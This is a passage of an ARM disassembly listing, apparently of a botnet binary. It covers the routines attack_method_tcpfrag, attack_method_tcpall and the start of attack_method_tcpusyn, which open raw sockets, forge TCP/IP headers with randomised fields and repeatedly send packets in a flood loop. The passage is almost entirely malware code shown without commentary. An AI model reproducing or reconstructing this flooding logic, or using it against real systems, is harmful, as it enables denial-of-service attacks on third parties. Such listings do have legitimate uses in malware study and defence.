    bbfc:	e1a01006 	mov	r1, r6
    bc00:	e1c621b0 	strh	r2, [r6, #16]
    bc04:	e3a03028 	mov	r3, #40	; 0x28
    bc08:	e3a02b0a 	mov	r2, #10240	; 0x2800
    bc0c:	e1a00005 	mov	r0, r5
    bc10:	eb000afd 	bl	e80c <checksum_tcpudp>
    bc14:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    bc18:	e1a0e283 	lsl	lr, r3, #5
    bc1c:	e1c601b0 	strh	r0, [r6, #16]
    bc20:	e04ee183 	sub	lr, lr, r3, lsl #3
    bc24:	e1d660b2 	ldrh	r6, [r6, #2]
    bc28:	e08ee008 	add	lr, lr, r8
    bc2c:	e1ce60b2 	strh	r6, [lr, #2]
    bc30:	e3a03901 	mov	r3, #16384	; 0x4000
    bc34:	e3a0c010 	mov	ip, #16
    bc38:	e1a01005 	mov	r1, r5
    bc3c:	e1a0000a 	mov	r0, sl
    bc40:	e3a0203c 	mov	r2, #60	; 0x3c
    bc44:	e58de000 	str	lr, [sp]
    bc48:	e58dc004 	str	ip, [sp, #4]
    bc4c:	eb003400 	bl	18c54 <__libc_sendto>
    bc50:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    bc54:	e2830001 	add	r0, r3, #1
    bc58:	e1500007 	cmp	r0, r7
    bc5c:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    bc60:	baffffc0 	blt	bb68 <attack_method_tcpfrag+0x49c>
    bc64:	e3a03000 	mov	r3, #0
    bc68:	e3570000 	cmp	r7, #0
    bc6c:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    bc70:	0affffb7 	beq	bb54 <attack_method_tcpfrag+0x488>
    bc74:	eaffffba 	b	bb64 <attack_method_tcpfrag+0x498>
    bc78:	e5934010 	ldr	r4, [r3, #16]
    bc7c:	eb0019e7 	bl	12420 <rand_next>
    bc80:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    bc84:	e1a01283 	lsl	r1, r3, #5
    bc88:	e0411183 	sub	r1, r1, r3, lsl #3
    bc8c:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    bc90:	e1a02c24 	lsr	r2, r4, #24
    bc94:	e182242c 	orr	r2, r2, ip, lsr #8
    bc98:	e0811008 	add	r1, r1, r8
    bc9c:	e2043cff 	and	r3, r4, #65280	; 0xff00
    bca0:	e5d1c014 	ldrb	ip, [r1, #20]
    bca4:	e1822403 	orr	r2, r2, r3, lsl #8
    bca8:	e1822c04 	orr	r2, r2, r4, lsl #24
    bcac:	e0822c30 	add	r2, r2, r0, lsr ip
    bcb0:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    bcb4:	e1a03c22 	lsr	r3, r2, #24
    bcb8:	e1833420 	orr	r3, r3, r0, lsr #8
    bcbc:	e2021cff 	and	r1, r2, #65280	; 0xff00
    bcc0:	e1833401 	orr	r3, r3, r1, lsl #8
    bcc4:	e1833c02 	orr	r3, r3, r2, lsl #24
    bcc8:	e5853010 	str	r3, [r5, #16]
    bccc:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    bcd0:	e3730001 	cmn	r3, #1
    bcd4:	1affffae 	bne	bb94 <attack_method_tcpfrag+0x4c8>
    bcd8:	eb0019d0 	bl	12420 <rand_next>
    bcdc:	e3a04801 	mov	r4, #65536	; 0x10000
    bce0:	e585000c 	str	r0, [r5, #12]
    bce4:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    bce8:	e2444001 	sub	r4, r4, #1
    bcec:	e1500004 	cmp	r0, r4
    bcf0:	1affffac 	bne	bba8 <attack_method_tcpfrag+0x4dc>
    bcf4:	eb0019c9 	bl	12420 <rand_next>
    bcf8:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    bcfc:	e1510004 	cmp	r1, r4
    bd00:	e1c500b4 	strh	r0, [r5, #4]
    bd04:	1affffaa 	bne	bbb4 <attack_method_tcpfrag+0x4e8>
    bd08:	eb0019c4 	bl	12420 <rand_next>
    bd0c:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    bd10:	e1520004 	cmp	r2, r4
    bd14:	e1c501b4 	strh	r0, [r5, #20]
    bd18:	1affffa8 	bne	bbc0 <attack_method_tcpfrag+0x4f4>
    bd1c:	eb0019bf 	bl	12420 <rand_next>
    bd20:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    bd24:	e1530004 	cmp	r3, r4
    bd28:	e1c600b2 	strh	r0, [r6, #2]
    bd2c:	1affffa6 	bne	bbcc <attack_method_tcpfrag+0x500>
    bd30:	eb0019ba 	bl	12420 <rand_next>
    bd34:	e5860004 	str	r0, [r6, #4]
    bd38:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    bd3c:	e1500004 	cmp	r0, r4
    bd40:	1affffa4 	bne	bbd8 <attack_method_tcpfrag+0x50c>
    bd44:	eb0019b5 	bl	12420 <rand_next>
    bd48:	e35b0000 	cmp	fp, #0
    bd4c:	e5860008 	str	r0, [r6, #8]
    bd50:	0affffa2 	beq	bbe0 <attack_method_tcpfrag+0x514>
    bd54:	eb0019b1 	bl	12420 <rand_next>
    bd58:	e1c601b2 	strh	r0, [r6, #18]
    bd5c:	eaffff9f 	b	bbe0 <attack_method_tcpfrag+0x514>
    bd60:	e1a0000a 	mov	r0, sl
    bd64:	eb003de1 	bl	1b4f0 <__GI___libc_close>
    bd68:	e28dd074 	add	sp, sp, #116	; 0x74
    bd6c:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    bd70:	e12fff1e 	bx	lr
    bd74:	0002c58c 	andeq	ip, r2, ip, lsl #11

0000bd78 <attack_method_tcpall>:
    bd78:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    bd7c:	e1a08001 	mov	r8, r1
    bd80:	e24dd074 	sub	sp, sp, #116	; 0x74
    bd84:	e3a01004 	mov	r1, #4
    bd88:	e1a04002 	mov	r4, r2
    bd8c:	e1a05003 	mov	r5, r3
    bd90:	e1a07000 	mov	r7, r0
    bd94:	eb0036c4 	bl	198ac <calloc>
    bd98:	e1a01005 	mov	r1, r5
    bd9c:	e3a02002 	mov	r2, #2
    bda0:	e3a03000 	mov	r3, #0
    bda4:	e1a09000 	mov	r9, r0
    bda8:	e1a00004 	mov	r0, r4
    bdac:	ebfff9db 	bl	a520 <attack_get_opt_int>
    bdb0:	e3a03801 	mov	r3, #65536	; 0x10000
    bdb4:	e1a0c000 	mov	ip, r0
    bdb8:	e20cc0ff 	and	ip, ip, #255	; 0xff
    bdbc:	e2433001 	sub	r3, r3, #1
    bdc0:	e3a02003 	mov	r2, #3
    bdc4:	e1a01005 	mov	r1, r5
    bdc8:	e1a00004 	mov	r0, r4
    bdcc:	e58dc048 	str	ip, [sp, #72]	; 0x48
    bdd0:	ebfff9d2 	bl	a520 <attack_get_opt_int>
    bdd4:	e1a01005 	mov	r1, r5
    bdd8:	e58d0024 	str	r0, [sp, #36]	; 0x24
    bddc:	e3a02004 	mov	r2, #4
    bde0:	e3a03040 	mov	r3, #64	; 0x40
    bde4:	e1a00004 	mov	r0, r4
    bde8:	ebfff9cc 	bl	a520 <attack_get_opt_int>
    bdec:	e1a0c000 	mov	ip, r0
    bdf0:	e20cc0ff 	and	ip, ip, #255	; 0xff
    bdf4:	e1a01005 	mov	r1, r5
    bdf8:	e3a02005 	mov	r2, #5
    bdfc:	e3a03001 	mov	r3, #1
    be00:	e1a00004 	mov	r0, r4
    be04:	e58dc050 	str	ip, [sp, #80]	; 0x50
    be08:	ebfff9c4 	bl	a520 <attack_get_opt_int>
    be0c:	e3a03801 	mov	r3, #65536	; 0x10000
    be10:	e1a0c000 	mov	ip, r0
    be14:	e20cc0ff 	and	ip, ip, #255	; 0xff
    be18:	e2433001 	sub	r3, r3, #1
    be1c:	e3a02006 	mov	r2, #6
    be20:	e1a01005 	mov	r1, r5
    be24:	e1a00004 	mov	r0, r4
    be28:	e58dc054 	str	ip, [sp, #84]	; 0x54
    be2c:	ebfff9bb 	bl	a520 <attack_get_opt_int>
    be30:	e3a03801 	mov	r3, #65536	; 0x10000
    be34:	e1a01005 	mov	r1, r5
    be38:	e2433001 	sub	r3, r3, #1
    be3c:	e3a02007 	mov	r2, #7
    be40:	e1a0b000 	mov	fp, r0
    be44:	e1a00004 	mov	r0, r4
    be48:	ebfff9b4 	bl	a520 <attack_get_opt_int>
    be4c:	e3a03801 	mov	r3, #65536	; 0x10000
    be50:	e1a01005 	mov	r1, r5
    be54:	e2433001 	sub	r3, r3, #1
    be58:	e3a02011 	mov	r2, #17
    be5c:	e1a06000 	mov	r6, r0
    be60:	e1a00004 	mov	r0, r4
    be64:	ebfff9ad 	bl	a520 <attack_get_opt_int>
    be68:	e1a01005 	mov	r1, r5
    be6c:	e58d0028 	str	r0, [sp, #40]	; 0x28
    be70:	e3a02012 	mov	r2, #18
    be74:	e3a03000 	mov	r3, #0
    be78:	e1a00004 	mov	r0, r4
    be7c:	ebfff9a7 	bl	a520 <attack_get_opt_int>
    be80:	e1a01005 	mov	r1, r5
    be84:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    be88:	e3a0200b 	mov	r2, #11
    be8c:	e3a03001 	mov	r3, #1
    be90:	e1a00004 	mov	r0, r4
    be94:	ebfff9a1 	bl	a520 <attack_get_opt_int>
    be98:	e1a01005 	mov	r1, r5
    be9c:	e58d0030 	str	r0, [sp, #48]	; 0x30
    bea0:	e3a0200c 	mov	r2, #12
    bea4:	e3a03001 	mov	r3, #1
    bea8:	e1a00004 	mov	r0, r4
    beac:	ebfff99b 	bl	a520 <attack_get_opt_int>
    beb0:	e1a01005 	mov	r1, r5
    beb4:	e58d0034 	str	r0, [sp, #52]	; 0x34
    beb8:	e3a0200d 	mov	r2, #13
    bebc:	e3a03001 	mov	r3, #1
    bec0:	e1a00004 	mov	r0, r4
    bec4:	ebfff995 	bl	a520 <attack_get_opt_int>
    bec8:	e1a01005 	mov	r1, r5
    becc:	e58d0038 	str	r0, [sp, #56]	; 0x38
    bed0:	e3a0200e 	mov	r2, #14
    bed4:	e3a03001 	mov	r3, #1
    bed8:	e1a00004 	mov	r0, r4
    bedc:	ebfff98f 	bl	a520 <attack_get_opt_int>
    bee0:	e1a01005 	mov	r1, r5
    bee4:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    bee8:	e3a0200f 	mov	r2, #15
    beec:	e3a03001 	mov	r3, #1
    bef0:	e1a00004 	mov	r0, r4
    bef4:	ebfff989 	bl	a520 <attack_get_opt_int>
    bef8:	e1a01005 	mov	r1, r5
    befc:	e58d0040 	str	r0, [sp, #64]	; 0x40
    bf00:	e3a02010 	mov	r2, #16
    bf04:	e3a03001 	mov	r3, #1
    bf08:	e1a00004 	mov	r0, r4
    bf0c:	ebfff983 	bl	a520 <attack_get_opt_int>
    bf10:	e59f2508 	ldr	r2, [pc, #1288]	; c420 <attack_method_tcpall+0x6a8>
    bf14:	e58d0044 	str	r0, [sp, #68]	; 0x44
    bf18:	e5923000 	ldr	r3, [r2]
    bf1c:	e1a01005 	mov	r1, r5
    bf20:	e3a02019 	mov	r2, #25
    bf24:	e1a00004 	mov	r0, r4
    bf28:	ebfff961 	bl	a4b4 <attack_get_opt_ip>
    bf2c:	e3a01003 	mov	r1, #3
    bf30:	e58d0060 	str	r0, [sp, #96]	; 0x60
    bf34:	e3a02006 	mov	r2, #6
    bf38:	e3a00002 	mov	r0, #2
    bf3c:	eb003378 	bl	18d24 <__GI_socket>
    bf40:	e3700001 	cmn	r0, #1
    bf44:	e1a0a000 	mov	sl, r0
    bf48:	0a000131 	beq	c414 <attack_method_tcpall+0x69c>
    bf4c:	e28d3070 	add	r3, sp, #112	; 0x70
    bf50:	e3a02001 	mov	r2, #1
    bf54:	e5232004 	str	r2, [r3, #-4]!
    bf58:	e3a0c004 	mov	ip, #4
    bf5c:	e3a01000 	mov	r1, #0
    bf60:	e2822002 	add	r2, r2, #2
    bf64:	e58dc000 	str	ip, [sp]
    bf68:	eb00335b 	bl	18cdc <__GI_setsockopt>
    bf6c:	e3700001 	cmn	r0, #1
    bf70:	0a000125 	beq	c40c <attack_method_tcpall+0x694>
    bf74:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    bf78:	e3a02000 	mov	r2, #0
    bf7c:	e1a00801 	lsl	r0, r1, #16
    bf80:	e1a0480b 	lsl	r4, fp, #16
    bf84:	e1a05806 	lsl	r5, r6, #16
    bf88:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    bf8c:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    bf90:	e1a03820 	lsr	r3, r0, #16
    bf94:	e1a06824 	lsr	r6, r4, #16
    bf98:	e1a01825 	lsr	r1, r5, #16
    bf9c:	e3570000 	cmp	r7, #0
    bfa0:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    bfa4:	e58d6058 	str	r6, [sp, #88]	; 0x58
    bfa8:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    bfac:	e202b0ff 	and	fp, r2, #255	; 0xff
    bfb0:	0a000092 	beq	c200 <attack_method_tcpall+0x488>
    bfb4:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    bfb8:	e1a0e803 	lsl	lr, r3, #16
    bfbc:	e1a03c06 	lsl	r3, r6, #24
    bfc0:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    bfc4:	e1a02c01 	lsl	r2, r1, #24
    bfc8:	e1a0140e 	lsl	r1, lr, #8
    bfcc:	e1a01821 	lsr	r1, r1, #16
    bfd0:	e1a00c20 	lsr	r0, r0, #24
    bfd4:	e206c0ff 	and	ip, r6, #255	; 0xff
    bfd8:	e181ec2e 	orr	lr, r1, lr, lsr #24
    bfdc:	e180c40c 	orr	ip, r0, ip, lsl #8
    bfe0:	e28d0030 	add	r0, sp, #48	; 0x30
    bfe4:	e8900003 	ldm	r0, {r0, r1}
    bfe8:	e1a03823 	lsr	r3, r3, #16
    bfec:	e1a02822 	lsr	r2, r2, #16
    bff0:	e2000001 	and	r0, r0, #1
    bff4:	e2011001 	and	r1, r1, #1
    bff8:	e1836c24 	orr	r6, r3, r4, lsr #24
    bffc:	e1825c25 	orr	r5, r2, r5, lsr #24
    c000:	e58d000c 	str	r0, [sp, #12]
    c004:	e58d1010 	str	r1, [sp, #16]
    c008:	e28d2038 	add	r2, sp, #56	; 0x38
    c00c:	e892000c 	ldm	r2, {r2, r3}
    c010:	e28d0040 	add	r0, sp, #64	; 0x40
    c014:	e8900003 	ldm	r0, {r0, r1}
    c018:	e2022001 	and	r2, r2, #1
    c01c:	e2033001 	and	r3, r3, #1
    c020:	e2000001 	and	r0, r0, #1
    c024:	e2011001 	and	r1, r1, #1
    c028:	e58de064 	str	lr, [sp, #100]	; 0x64
    c02c:	e58dc008 	str	ip, [sp, #8]
    c030:	e58d2014 	str	r2, [sp, #20]
    c034:	e58d3018 	str	r3, [sp, #24]
    c038:	e58d001c 	str	r0, [sp, #28]
    c03c:	e58d1020 	str	r1, [sp, #32]
    c040:	e3a04000 	mov	r4, #0
    c044:	e3a01001 	mov	r1, #1
    c048:	e3a00080 	mov	r0, #128	; 0x80
    c04c:	eb003616 	bl	198ac <calloc>
    c050:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    c054:	e7890104 	str	r0, [r9, r4, lsl #2]
    c058:	e1a03282 	lsl	r3, r2, #5
    c05c:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    c060:	e0433182 	sub	r3, r3, r2, lsl #3
    c064:	e0830008 	add	r0, r3, r8
    c068:	e5d43000 	ldrb	r3, [r4]
    c06c:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    c070:	e3833040 	orr	r3, r3, #64	; 0x40
    c074:	e5c43000 	strb	r3, [r4]
    c078:	e5d42000 	ldrb	r2, [r4]
    c07c:	e3c2200a 	bic	r2, r2, #10
    c080:	e3822005 	orr	r2, r2, #5
    c084:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    c088:	e5c42000 	strb	r2, [r4]
    c08c:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    c090:	e5c41001 	strb	r1, [r4, #1]
    c094:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    c098:	e3530000 	cmp	r3, #0
    c09c:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    c0a0:	e5c42008 	strb	r2, [r4, #8]
    c0a4:	e1c430b2 	strh	r3, [r4, #2]
    c0a8:	e3a03006 	mov	r3, #6
    c0ac:	e59d1008 	ldr	r1, [sp, #8]
    c0b0:	13a02040 	movne	r2, #64	; 0x40
    c0b4:	e5c43009 	strb	r3, [r4, #9]
    c0b8:	11c420b6 	strhne	r2, [r4, #6]
    c0bc:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    c0c0:	e584200c 	str	r2, [r4, #12]
    c0c4:	e5903010 	ldr	r3, [r0, #16]
    c0c8:	e1c410b4 	strh	r1, [r4, #4]
    c0cc:	e5843010 	str	r3, [r4, #16]
    c0d0:	e1c461b4 	strh	r6, [r4, #20]
    c0d4:	e2841014 	add	r1, r4, #20
    c0d8:	e5d1300c 	ldrb	r3, [r1, #12]
    c0dc:	e5d1200d 	ldrb	r2, [r1, #13]
    c0e0:	e59d000c 	ldr	r0, [sp, #12]
    c0e4:	e3c33050 	bic	r3, r3, #80	; 0x50
    c0e8:	e38330a0 	orr	r3, r3, #160	; 0xa0
    c0ec:	e3c22020 	bic	r2, r2, #32
    c0f0:	e5c1300c 	strb	r3, [r1, #12]
    c0f4:	e1822280 	orr	r2, r2, r0, lsl #5
    c0f8:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    c0fc:	e5c1200d 	strb	r2, [r1, #13]
    c100:	e5813004 	str	r3, [r1, #4]
    c104:	e5d1300d 	ldrb	r3, [r1, #13]
    c108:	e59d0010 	ldr	r0, [sp, #16]
    c10c:	e3c33010 	bic	r3, r3, #16
    c110:	e1833200 	orr	r3, r3, r0, lsl #4
    c114:	e5c1300d 	strb	r3, [r1, #13]
    c118:	e5d1200d 	ldrb	r2, [r1, #13]
    c11c:	e59d3014 	ldr	r3, [sp, #20]
    c120:	e3c22008 	bic	r2, r2, #8
    c124:	e1822183 	orr	r2, r2, r3, lsl #3
    c128:	e1c150b2 	strh	r5, [r1, #2]
    c12c:	e5c1200d 	strb	r2, [r1, #13]
    c130:	e5d1300d 	ldrb	r3, [r1, #13]
    c134:	e59d0018 	ldr	r0, [sp, #24]
    c138:	e3c33004 	bic	r3, r3, #4
    c13c:	e1833100 	orr	r3, r3, r0, lsl #2
    c140:	e5c1300d 	strb	r3, [r1, #13]
    c144:	e5d1200d 	ldrb	r2, [r1, #13]
    c148:	e59d301c 	ldr	r3, [sp, #28]
    c14c:	e3c22002 	bic	r2, r2, #2
    c150:	e1822083 	orr	r2, r2, r3, lsl #1
    c154:	e5c1200d 	strb	r2, [r1, #13]
    c158:	e5d1300d 	ldrb	r3, [r1, #13]
    c15c:	e59d0020 	ldr	r0, [sp, #32]
    c160:	e3c33001 	bic	r3, r3, #1
    c164:	e1803003 	orr	r3, r0, r3
    c168:	e5c1300d 	strb	r3, [r1, #13]
    c16c:	e3a02004 	mov	r2, #4
    c170:	e3a01002 	mov	r1, #2
    c174:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    c178:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    c17c:	eb0018a7 	bl	12420 <rand_next>
    c180:	e200000f 	and	r0, r0, #15
    c184:	e2800e57 	add	r0, r0, #1392	; 0x570
    c188:	e2800008 	add	r0, r0, #8
    c18c:	e1a00800 	lsl	r0, r0, #16
    c190:	e1a03420 	lsr	r3, r0, #8
    c194:	e2033cff 	and	r3, r3, #65280	; 0xff00
    c198:	e1833c20 	orr	r3, r3, r0, lsr #24
    c19c:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    c1a0:	e3a03004 	mov	r3, #4
    c1a4:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    c1a8:	e3a0200a 	mov	r2, #10
    c1ac:	e3a03008 	mov	r3, #8
    c1b0:	e3a00002 	mov	r0, #2
    c1b4:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    c1b8:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    c1bc:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    c1c0:	eb001896 	bl	12420 <rand_next>
    c1c4:	e3a02006 	mov	r2, #6
    c1c8:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    c1cc:	e3a01003 	mov	r1, #3
    c1d0:	e3a03000 	mov	r3, #0
    c1d4:	e3a02001 	mov	r2, #1
    c1d8:	e5840030 	str	r0, [r4, #48]	; 0x30
    c1dc:	e5843034 	str	r3, [r4, #52]	; 0x34
    c1e0:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    c1e4:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    c1e8:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    c1ec:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c1f0:	e0834002 	add	r4, r3, r2
    c1f4:	e1540007 	cmp	r4, r7
    c1f8:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    c1fc:	baffff90 	blt	c044 <attack_method_tcpall+0x2cc>
    c200:	e3a03000 	mov	r3, #0
    c204:	e3570000 	cmp	r7, #0
    c208:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    c20c:	0afffffb 	beq	c200 <attack_method_tcpall+0x488>
    c210:	e1a00003 	mov	r0, r3
    c214:	e1a03280 	lsl	r3, r0, #5
    c218:	e0433180 	sub	r3, r3, r0, lsl #3
    c21c:	e0833008 	add	r3, r3, r8
    c220:	e5d32014 	ldrb	r2, [r3, #20]
    c224:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    c228:	e352001f 	cmp	r2, #31
    c22c:	e2856014 	add	r6, r5, #20
    c230:	9a00003b 	bls	c324 <attack_method_tcpall+0x5ac>
    c234:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    c238:	e3730001 	cmn	r3, #1
    c23c:	0a000050 	beq	c384 <attack_method_tcpall+0x60c>
    c240:	e3a04801 	mov	r4, #65536	; 0x10000
    c244:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    c248:	e2444001 	sub	r4, r4, #1
    c24c:	e1500004 	cmp	r0, r4
    c250:	0a000052 	beq	c3a0 <attack_method_tcpall+0x628>
    c254:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    c258:	e1510004 	cmp	r1, r4
    c25c:	0a000054 	beq	c3b4 <attack_method_tcpall+0x63c>
    c260:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    c264:	e1520004 	cmp	r2, r4
    c268:	0a000056 	beq	c3c8 <attack_method_tcpall+0x650>
    c26c:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    c270:	e1530004 	cmp	r3, r4
    c274:	0a000058 	beq	c3dc <attack_method_tcpall+0x664>
    c278:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    c27c:	e1500004 	cmp	r0, r4
    c280:	0a00005a 	beq	c3f0 <attack_method_tcpall+0x678>
    c284:	e35b0000 	cmp	fp, #0
    c288:	1a00005c 	bne	c400 <attack_method_tcpall+0x688>
    c28c:	e3a01000 	mov	r1, #0
    c290:	e1c510ba 	strh	r1, [r5, #10]
    c294:	e1a00005 	mov	r0, r5
    c298:	e3a01014 	mov	r1, #20
    c29c:	eb000946 	bl	e7bc <checksum_generic>
    c2a0:	e3a02000 	mov	r2, #0
    c2a4:	e1c500ba 	strh	r0, [r5, #10]
    c2a8:	e1a01006 	mov	r1, r6
    c2ac:	e1c621b0 	strh	r2, [r6, #16]
    c2b0:	e3a03028 	mov	r3, #40	; 0x28
    c2b4:	e3a02b0a 	mov	r2, #10240	; 0x2800
    c2b8:	e1a00005 	mov	r0, r5
    c2bc:	eb000952 	bl	e80c <checksum_tcpudp>
    c2c0:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c2c4:	e1a0e283 	lsl	lr, r3, #5
    c2c8:	e1c601b0 	strh	r0, [r6, #16]
    c2cc:	e04ee183 	sub	lr, lr, r3, lsl #3
    c2d0:	e1d660b2 	ldrh	r6, [r6, #2]
    c2d4:	e08ee008 	add	lr, lr, r8
    c2d8:	e1ce60b2 	strh	r6, [lr, #2]
    c2dc:	e3a03901 	mov	r3, #16384	; 0x4000
    c2e0:	e3a0c010 	mov	ip, #16
    c2e4:	e1a01005 	mov	r1, r5
    c2e8:	e1a0000a 	mov	r0, sl
    c2ec:	e3a0203c 	mov	r2, #60	; 0x3c
    c2f0:	e58de000 	str	lr, [sp]
    c2f4:	e58dc004 	str	ip, [sp, #4]
    c2f8:	eb003255 	bl	18c54 <__libc_sendto>
    c2fc:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c300:	e2830001 	add	r0, r3, #1
    c304:	e1500007 	cmp	r0, r7
    c308:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    c30c:	baffffc0 	blt	c214 <attack_method_tcpall+0x49c>
    c310:	e3a03000 	mov	r3, #0
    c314:	e3570000 	cmp	r7, #0
    c318:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    c31c:	0affffb7 	beq	c200 <attack_method_tcpall+0x488>
    c320:	eaffffba 	b	c210 <attack_method_tcpall+0x498>
    c324:	e5934010 	ldr	r4, [r3, #16]
    c328:	eb00183c 	bl	12420 <rand_next>
    c32c:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c330:	e1a01283 	lsl	r1, r3, #5
    c334:	e0411183 	sub	r1, r1, r3, lsl #3
    c338:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    c33c:	e1a02c24 	lsr	r2, r4, #24
    c340:	e182242c 	orr	r2, r2, ip, lsr #8
    c344:	e0811008 	add	r1, r1, r8
    c348:	e2043cff 	and	r3, r4, #65280	; 0xff00
    c34c:	e5d1c014 	ldrb	ip, [r1, #20]
    c350:	e1822403 	orr	r2, r2, r3, lsl #8
    c354:	e1822c04 	orr	r2, r2, r4, lsl #24
    c358:	e0822c30 	add	r2, r2, r0, lsr ip
    c35c:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    c360:	e1a03c22 	lsr	r3, r2, #24
    c364:	e1833420 	orr	r3, r3, r0, lsr #8
    c368:	e2021cff 	and	r1, r2, #65280	; 0xff00
    c36c:	e1833401 	orr	r3, r3, r1, lsl #8
    c370:	e1833c02 	orr	r3, r3, r2, lsl #24
    c374:	e5853010 	str	r3, [r5, #16]
    c378:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    c37c:	e3730001 	cmn	r3, #1
    c380:	1affffae 	bne	c240 <attack_method_tcpall+0x4c8>
    c384:	eb001825 	bl	12420 <rand_next>
    c388:	e3a04801 	mov	r4, #65536	; 0x10000
    c38c:	e585000c 	str	r0, [r5, #12]
    c390:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    c394:	e2444001 	sub	r4, r4, #1
    c398:	e1500004 	cmp	r0, r4
    c39c:	1affffac 	bne	c254 <attack_method_tcpall+0x4dc>
    c3a0:	eb00181e 	bl	12420 <rand_next>
    c3a4:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    c3a8:	e1510004 	cmp	r1, r4
    c3ac:	e1c500b4 	strh	r0, [r5, #4]
    c3b0:	1affffaa 	bne	c260 <attack_method_tcpall+0x4e8>
    c3b4:	eb001819 	bl	12420 <rand_next>
    c3b8:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    c3bc:	e1520004 	cmp	r2, r4
    c3c0:	e1c501b4 	strh	r0, [r5, #20]
    c3c4:	1affffa8 	bne	c26c <attack_method_tcpall+0x4f4>
    c3c8:	eb001814 	bl	12420 <rand_next>
    c3cc:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    c3d0:	e1530004 	cmp	r3, r4
    c3d4:	e1c600b2 	strh	r0, [r6, #2]
    c3d8:	1affffa6 	bne	c278 <attack_method_tcpall+0x500>
    c3dc:	eb00180f 	bl	12420 <rand_next>
    c3e0:	e5860004 	str	r0, [r6, #4]
    c3e4:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    c3e8:	e1500004 	cmp	r0, r4
    c3ec:	1affffa4 	bne	c284 <attack_method_tcpall+0x50c>
    c3f0:	eb00180a 	bl	12420 <rand_next>
    c3f4:	e35b0000 	cmp	fp, #0
    c3f8:	e5860008 	str	r0, [r6, #8]
    c3fc:	0affffa2 	beq	c28c <attack_method_tcpall+0x514>
    c400:	eb001806 	bl	12420 <rand_next>
    c404:	e1c601b2 	strh	r0, [r6, #18]
    c408:	eaffff9f 	b	c28c <attack_method_tcpall+0x514>
    c40c:	e1a0000a 	mov	r0, sl
    c410:	eb003c36 	bl	1b4f0 <__GI___libc_close>
    c414:	e28dd074 	add	sp, sp, #116	; 0x74
    c418:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    c41c:	e12fff1e 	bx	lr
    c420:	0002c58c 	andeq	ip, r2, ip, lsl #11

0000c424 <attack_method_tcpusyn>:
    c424:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    c428:	e1a08001 	mov	r8, r1
    c42c:	e24dd074 	sub	sp, sp, #116	; 0x74
    c430:	e3a01004 	mov	r1, #4
    c434:	e1a04002 	mov	r4, r2
    c438:	e1a05003 	mov	r5, r3
    c43c:	e1a07000 	mov	r7, r0
    c440:	eb003519 	bl	198ac <calloc>
    c444:	e1a01005 	mov	r1, r5
    c448:	e3a02002 	mov	r2, #2
    c44c:	e3a03000 	mov	r3, #0
    c450:	e1a09000 	mov	r9, r0
    c454:	e1a00004 	mov	r0, r4
    c458:	ebfff830 	bl	a520 <attack_get_opt_int>
